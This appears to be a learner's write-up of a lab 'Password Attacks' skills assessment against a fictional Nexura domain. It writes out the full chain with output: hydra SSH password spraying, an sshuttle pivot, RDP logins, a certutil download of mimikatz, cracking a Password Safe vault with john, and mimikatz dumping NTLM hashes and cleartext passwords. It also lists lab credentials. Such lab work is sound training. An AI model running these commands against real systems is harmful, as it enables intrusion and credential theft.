# Skills Assessment - Password Attacks

## The Credential Theft Shuffle

[The Credential Theft Shuffle](https://adsecurity.org/?p=2362), as coined by `Sean Metcalf`, is a systematic approach attackers use to compromise Active Directory environments by exploiting `stolen credentials`. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to `move laterally across the network`. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and `gain control over the domain`, often by compromising Domain Admin accounts or performing DCSync attacks. Sean emphasizes the importance of implementing security measures such as the `Local Administrator Password Solution (LAPS)`, enforcing `multi-factor authentication`, and `restricting administrative privileges` to mitigate such attacks.
## Skills Assessment

`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:

|Host|IP Address|
|---|---|
|`DMZ01`|`10.129.*.*` **(External)**, `172.16.119.13` **(Internal)**|
|`JUMP01`|`172.16.119.7`|
|`FILE01`|`172.16.119.10`|
|`DC01`|`172.16.119.11`|
#### Pivoting Primer


# Question

```shell
unsername-anarchy Betty Jayde > usernames.txt
hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116

[DATA] attacking ssh://10.129.234.116:22/
[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
```

```shell
ssh jbetty@IP -p Texas123!@#
```

I looked for lots of attack vector 


We have to set a stablished connection with the internal network

```shell
sshuttle -r jbetty@10.129.234.116 172.16.119.0/24 -v
# In other terminal
# ping is disabled but rdp no
xfreerdp /v:172.16.119.7 /u:hwilliam /dynamic-resolution /p:dealer-screwed-gym1 
# Password found
dealer-screwed-gym1
```

```powershell
certutil -urlcache -split -f http://172.16.119.13:8080/mimikatz.exe C:\Temp\mimikatz.exe


```

![](../src/10_src/10_dropzone.png)

![](../src/10_src/10_OnlinePasswords.png)

```shell
file Employee-Passwords_OLD.psafe3
Employee-Passwords_OLD.psafe3: Password Safe V3 database
```

```shell
locate '*2john' 
/usr/bin/pwsafe2john Employee-Passwords_OLD.psafe3 > psafe3.hash
john --wordlist=/usr/share/wordlists/rockyou.txt psafe3.hash
---
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 262144 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
michaeljackson   (Employee-Passwords_OLD)     
1g 0:00:01:17 DONE (2026-10-16 18:59) 0.01290g/s 132.1p/s 132.1c/s 132.1C/s total90..1asshole
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I used Password Safe 3 app to got the next credencials

![](../src/10_src/10_Psafe3.png)

![](../src/10_src/10_userspass.png)

| Nombre         | Usuario  | Contraseña            |
| -------------- | -------- | --------------------- |
| Betty Jayde    | jbetty   | xiao-nicer-wheels5    |
| David Brittni  | bdavid   | caramel-cigars-reply1 |
| Tom Sandy      | stom     | fails-nibble-disturb4 |
| William Hallam | hwilliam | warned-wobble-occur8  |
```shell
xfreerdp /v:172.16.119.11 /u:bdavid /p:'caramel-cigars-reply1' /d:nexura.htb
```

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# OR (one line)
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit" > C:\Temp\creds.txt
---
Authentication Id : 0 ; 258343 (00000000:0003f127)
Session           : RemoteInteractive from 2
User Name         : stom
Domain            : NEXURA
Logon Server      : DC01
Logon Time        : 10/16/2026 9:20:46 PM
SID               : S-1-5-21-1333759777-277832620-2286231135-1106
	msv :	
	 [00000003] Primary
	 * Username : stom
	 * Domain   : NEXURA
	 * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
	 * SHA1     : f2fc2263e4d7cff0fbb19ef485891774f0ad6031
	 * DPAPI    : 06e85cb199e902a0145ff04963e7dd72
	tspkg :	
	wdigest :	
	 * Username : stom
	 * Domain   : NEXURA
	 * Password : (null)
	kerberos :	
	 * Username : stom
	 * Domain   : NEXURA.HTB
	 * Password : calves-warp-learning1 # Here we have the psswd
	ssp :	
	credman :	
```

And we have the cred `stom` with psswd `calves-warp-learning1`.


